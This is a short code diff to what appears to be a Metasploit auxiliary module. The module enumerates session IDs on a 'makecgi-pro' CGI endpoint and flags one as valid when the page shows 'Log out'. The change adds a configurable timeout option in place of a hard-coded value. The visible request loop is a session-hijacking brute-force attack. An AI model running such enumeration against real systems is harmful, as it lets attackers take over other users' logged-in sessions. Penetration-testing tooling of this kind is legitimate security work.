@@ -29,8 +29,13 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])
+        OptInt.new('SID_MAX', [ true, 'Maximum Session ID', 100 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run
@@ -41,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
         res = send_request_raw({
           'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
           'method'  => 'GET'
-        }, 25)
+        }, timeout)
 
         if (res and res.to_s =~ /Log out/)
           print_status("Found valid session ID number #{x.to_s}!")
